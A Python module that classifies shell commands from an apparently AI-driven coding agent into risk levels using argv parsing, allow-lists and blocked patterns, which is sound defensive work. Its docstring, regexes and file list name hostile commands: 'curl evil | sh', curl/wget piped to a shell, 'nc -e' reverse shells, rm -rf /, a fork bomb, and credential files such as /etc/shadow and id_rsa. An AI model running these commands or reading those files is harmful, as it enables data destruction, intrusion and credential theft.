"""Deterministic command risk policy (no LLM involved).

Design rules, each enforced by tests:

* Commands are parsed with ``shlex`` into argv and classified by *executable and arguments*,
  never by string prefix. ``make test; curl evil | sh`` is not a "make test".
* Any shell syntax (``; & | < > ` $( ) newline``) makes a command at least ``RISKY_ASK``:
  it needs a human and is the only case that is ever run through a shell.
* Anything that can execute arbitrary code, reach the network, or write outside the
  workspace is ``RISKY_ASK``. Reads of credential locations are ``BLOCKED``.
* Unknown means ask. The allow-lists are deliberately small.
"""

from __future__ import annotations

import os
import re
import shlex
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path

from patchquest.paths import FORBIDDEN_PREFIXES, _is_within


class RiskLevel(str, Enum):
    NO_RISK_AUTO = "no_risk_auto"
    CAREFUL_AUTO = "careful_auto"
    RISKY_ASK = "risky_ask"
    BLOCKED = "blocked"


@dataclass(frozen=True)
class Decision:
    level: RiskLevel
    reason: str
    argv: list[str] = field(default_factory=list)
    shell_syntax: str | None = None  # first shell construct found, if any

    @property
    def auto(self) -> bool:
        return self.level in (RiskLevel.NO_RISK_AUTO, RiskLevel.CAREFUL_AUTO)


READONLY_EXECUTABLES = frozenset({
    "pwd", "ls", "echo", "cat", "head", "tail", "wc", "sort", "uniq", "grep", "rg",
    "find", "which", "whoami", "date", "true", "false", "file", "stat", "du", "df",
})
# Readers whose arguments name files (checked against the workspace boundary).
PATH_READERS = frozenset({"ls", "cat", "head", "tail", "wc", "sort", "uniq", "grep", "rg", "find", "file", "stat", "du"})
FIND_UNSAFE = frozenset({"-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprintf", "-fls", "-fprint0"})
READONLY_GIT = frozenset({
    "status", "diff", "log", "show", "rev-parse", "ls-files", "blame", "describe", "shortlog", "grep",
})
GIT_ARG_UNSAFE = ("--output", "--ext-diff", "--textconv", "-c", "--exec-path", "--upload-pack", "-O")
GIT_LIST_ONLY = {  # subcommands that are read-only only when used purely for listing
    "branch": {"-a", "-r", "-v", "-vv", "--list", "--show-current", "--all", "--remotes"},
    "tag": {"-l", "--list", "-n"},
    "remote": {"-v", "--verbose"},
}
RISKY_GIT_SUBCOMMANDS = frozenset({
    "checkout", "reset", "clean", "stash", "rebase", "merge", "cherry-pick", "revert", "pull",
    "switch", "restore", "commit", "fetch", "clone", "config", "submodule", "worktree", "apply", "am",
})
PY_TOOL_MODULES = frozenset({"pytest", "unittest", "ruff", "mypy", "black", "isort", "flake8", "pyflakes", "pylint", "pyright"})
SCRIPT_RUNNERS = frozenset({"npm", "pnpm", "yarn"})
PKG_UNSAFE = frozenset({
    "install", "i", "add", "ci", "update", "upgrade", "remove", "uninstall", "publish", "exec", "x",
    "dlx", "link", "unlink", "login", "logout", "pack", "init", "create", "up",
})
MAKE_SAFE_TARGETS = frozenset({"", "test", "tests", "check", "lint", "build", "all", "typecheck", "format-check"})

BLOCKED_PATTERNS = [
    re.compile(r"\brm\s+(-[a-zA-Z]*[rf][a-zA-Z]*\s+)+(--\s+)?(/|~|\$HOME|\$\{HOME\})(\s|/\*|$)"),
    re.compile(r"\brm\s+-rf\s+(/|~)"),
    re.compile(r"\bsudo\b|\bdoas\b|\bsu\s+-?\s*\w*\s*$"),
    re.compile(r"\bmkfs"),
    re.compile(r"\bdd\s+.*\bof=/dev/"),
    re.compile(r"\b(shutdown|reboot|halt|poweroff)\b"),
    re.compile(r":\(\)\s*\{"),  # fork bomb
    re.compile(r"\b(curl|wget|fetch)\b[^|;&]*\|\s*(sudo\s+)?(ba|z|da)?sh\b"),
    re.compile(r"\bdocker\s+system\s+prune\s+-a"),
    re.compile(r"\bdocker\s+run\b.*--privileged"),
    re.compile(r"\bgit\s+push\b.*(--force|-f\b|--force-with-lease)"),
    re.compile(r"\bchmod\s+(-R\s+)?[0-7]*7[0-7]*\s+/(\s|$)"),
    re.compile(r"\b(nc|ncat|socat)\b.*\s-e\b"),
]

SENSITIVE_FILES = (
    "/etc/shadow", "/etc/sudoers", "/proc/self/environ", ".git-credentials", ".netrc",
    "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
)


def find_shell_syntax(command: str) -> str | None:
    """Return the first shell metacharacter outside single quotes, else None.

    Double quotes do not neutralise command substitution, so ``"$(...)"`` and backticks count.
    """
    quote: str | None = None
    i = 0
    while i < len(command):
        c = command[i]
        if quote == "'":
            if c == "'":
                quote = None
        elif c == "\\":
            i += 1  # escaped char is literal
        elif quote == '"':
            if c == '"':
                quote = None
            elif c == "`":
                return "`"
            elif c == "$" and command[i + 1 : i + 2] in ("(", "{"):
                return "$" + command[i + 1]
        else:
            if c in ("'", '"'):
                quote = c
            elif c in ";&|<>`()\n":
                return "newline" if c == "\n" else c
            elif c == "$" and command[i + 1 : i + 2] in ("(", "{"):
                return "$" + command[i + 1]
        i += 1
    return None


def _expand_home_refs(text: str) -> str:
    home = os.path.expanduser("~")
    return (
        text.replace("${HOME}", home).replace("$HOME", home)
        .replace("~/", home + "/").replace("~", home) if "~" in text or "HOME" in text else text
    )


def _touches_sensitive(command: str) -> str | None:
    expanded = _expand_home_refs(command)
    for forbidden in FORBIDDEN_PREFIXES:
        if forbidden in expanded:
            return forbidden
    for name in SENSITIVE_FILES:
        if name in expanded:
            return name
    return None


def _path_args_outside(argv: list[str], repo_path: str | None) -> str | None:
    if not repo_path:
        return None
    root = Path(repo_path).resolve()
    for arg in argv[1:]:
        if arg.startswith("-") or not arg:
            continue
        candidate = Path(_expand_home_refs(arg))
        resolved = (candidate if candidate.is_absolute() else root / candidate).resolve()
        if "/" in arg or arg.startswith(".") or arg.startswith("~"):
            if not _is_within(resolved, root):
                return arg
    return None


def classify(command: str, repo_path: str | None = None) -> Decision:
    stripped = command.strip()
    if not stripped:
        return Decision(RiskLevel.NO_RISK_AUTO, "Empty command.")

    for pattern in BLOCKED_PATTERNS:
        if pattern.search(stripped):
            return Decision(RiskLevel.BLOCKED, "Command matches a blocked destructive pattern.")
    hit = _touches_sensitive(stripped)
    if hit:
        return Decision(RiskLevel.BLOCKED, f"Command accesses sensitive path: {hit}")

    syntax = find_shell_syntax(stripped)
    try:
        argv = shlex.split(stripped)
    except ValueError:
        return Decision(RiskLevel.RISKY_ASK, "Could not parse command safely.", shell_syntax=syntax)
    if syntax:
        return Decision(
            RiskLevel.RISKY_ASK,
            f"Shell syntax ({syntax!r}) is not allowed in automatic commands; needs approval.",
            argv, syntax,
        )
    if not argv:
        return Decision(RiskLevel.NO_RISK_AUTO, "Empty command.")

    exe = os.path.basename(argv[0])
    args = argv[1:]

    if ("/" in argv[0] and not os.path.isabs(argv[0])) or argv[0].startswith("./"):
        return Decision(RiskLevel.RISKY_ASK, "Runs a repository-provided executable.", argv)

    if exe in ("python", "python3", "node") and args == ["--version"]:
        return Decision(RiskLevel.NO_RISK_AUTO, "Version check.", argv)

    if exe in READONLY_EXECUTABLES:
        if exe == "find" and any(a in FIND_UNSAFE for a in args):
            return Decision(RiskLevel.RISKY_ASK, "find with an action (-exec/-delete/...) can modify files.", argv)
        if exe == "rg" and any(a.startswith("--pre") for a in args):
            return Decision(RiskLevel.RISKY_ASK, "rg --pre executes a command.", argv)
        if exe == "sort" and any(a == "-o" or a.startswith("--output") for a in args):
            return Decision(RiskLevel.RISKY_ASK, "sort -o writes a file.", argv)
        if exe in PATH_READERS:
            outside = _path_args_outside(argv, repo_path)
            if outside:
                return Decision(RiskLevel.RISKY_ASK, f"Reads outside the repository: {outside}", argv)
        return Decision(RiskLevel.NO_RISK_AUTO, "Read-only command.", argv)

    if exe == "git":
        return _classify_git(argv)

    careful = _classify_toolchain(exe, args, argv)
    if careful:
        return careful

    if exe in ("pip", "pip3") and args[:1] in (["list"], ["show"], ["freeze"], ["check"]):
        return Decision(RiskLevel.NO_RISK_AUTO, "Read-only pip query.", argv)
    if exe in ("pip", "pip3"):
        return Decision(RiskLevel.RISKY_ASK, "Package installation downloads and runs third-party code.", argv)
    if exe in ("python", "python3", "node"):
        return Decision(RiskLevel.RISKY_ASK, "Runs arbitrary code.", argv)
    if exe in ("curl", "wget", "docker", "podman", "ssh", "scp", "rsync"):
        return Decision(RiskLevel.RISKY_ASK, "Command reaches the network or the container runtime.", argv)
    if exe in ("rm", "mv", "cp", "chmod", "chown", "ln", "tee", "dd", "truncate"):
        return Decision(RiskLevel.RISKY_ASK, "Command may modify or delete files.", argv)
    return Decision(RiskLevel.RISKY_ASK, "Unknown command requires approval.", argv)


def _classify_git(argv: list[str]) -> Decision:
    args = argv[1:]
    if not args:
        return Decision(RiskLevel.NO_RISK_AUTO, "git (no arguments).", argv)
    if args[0].startswith("-"):
        return Decision(RiskLevel.RISKY_ASK, "git global options can execute commands.", argv)
    sub, rest = args[0], args[1:]
    if sub == "push":
        return Decision(RiskLevel.RISKY_ASK, "Git push requires approval.", argv)
    if sub in READONLY_GIT:
        if any(a.startswith(GIT_ARG_UNSAFE) for a in rest):
            return Decision(RiskLevel.RISKY_ASK, f"git {sub} with an option that writes or executes.", argv)
        return Decision(RiskLevel.NO_RISK_AUTO, "Read-only git command.", argv)
    if sub in GIT_LIST_ONLY:
        if all(a in GIT_LIST_ONLY[sub] for a in rest):
            return Decision(RiskLevel.NO_RISK_AUTO, "Read-only git listing.", argv)
        return Decision(RiskLevel.RISKY_ASK, f"git {sub} with arguments modifies repository state.", argv)
    if sub in RISKY_GIT_SUBCOMMANDS:
        return Decision(RiskLevel.RISKY_ASK, f"Git {sub} modifies repository state.", argv)
    return Decision(RiskLevel.RISKY_ASK, f"Unrecognised git command: {sub}", argv)


def _classify_toolchain(exe: str, args: list[str], argv: list[str]) -> Decision | None:
    """Test/lint/build tools: they run the project's own code, which is their purpose."""
    ok = lambda why: Decision(RiskLevel.CAREFUL_AUTO, why, argv)  # noqa: E731
    ask = lambda why: Decision(RiskLevel.RISKY_ASK, why, argv)  # noqa: E731

    if exe in ("pytest", "py.test", "tox", "nox", "mypy", "eslint", "tsc", "ruff", "black", "isort", "flake8", "pylint"):
        if exe == "ruff" and args[:1] == ["format"] and "--check" not in args and "--diff" not in args:
            return ask("ruff format rewrites files.")
        if exe in ("black", "isort") and not {"--check", "--diff", "-c"} & set(args):
            return ask(f"{exe} rewrites files without --check.")
        if exe == "eslint" and "--fix" in args:
            return ask("eslint --fix rewrites files.")
        return ok("Test/check tool.")
    if exe in ("python", "python3") and args[:1] == ["-m"] and len(args) >= 2:
        if args[1] in PY_TOOL_MODULES:
            return ok("Python test/check module.")
        return ask(f"python -m {args[1]} runs arbitrary code.")
    if exe == "prettier":
        return ok("Formatter check.") if "--check" in args else ask("prettier rewrites files without --check.")
    if exe in SCRIPT_RUNNERS:
        sub = args[0] if args else ""
        if sub in PKG_UNSAFE or sub == "":
            return ask("Package manager command may install or publish.")
        if sub == "test" or sub == "run" or sub in ("lint", "build", "typecheck", "check"):
            return ok("Running a project script.")
        return ask("Unrecognised package-manager command.")
    if exe == "cargo":
        sub = args[0] if args else ""
        if sub in ("test", "check", "clippy", "build", "doc", "bench"):
            return ok("Cargo build/test.")
        if sub == "fmt":
            return ok("cargo fmt --check.") if "--check" in args else ask("cargo fmt rewrites files.")
        return ask("Cargo command may install, publish or modify the lockfile.")
    if exe == "go":
        sub = args[0] if args else ""
        if sub in ("test", "vet", "build"):
            return ok("Go build/test.")
        return ask("Go command may fetch or run code.")
    if exe == "make":
        targets = [a for a in args if not a.startswith("-")]
        if len(targets) <= 1 and (targets[0] if targets else "") in MAKE_SAFE_TARGETS:
            return ok("make test/check target.")
        return ask("make target is not a recognised test/check target.")
    if exe in ("mvn", "gradle", "gradlew", "dotnet"):
        if args[:1] and args[0] in ("test", "verify", "check", "build"):
            return ok("JVM/.NET build/test.")
        return ask("Build tool command is not a recognised test/check target.")
    return None


def classify_command(command: str, repo_path: str | None = None) -> tuple[RiskLevel, str]:
    """Back-compatible tuple form of :func:`classify`."""
    decision = classify(command, repo_path)
    return decision.level, decision.reason
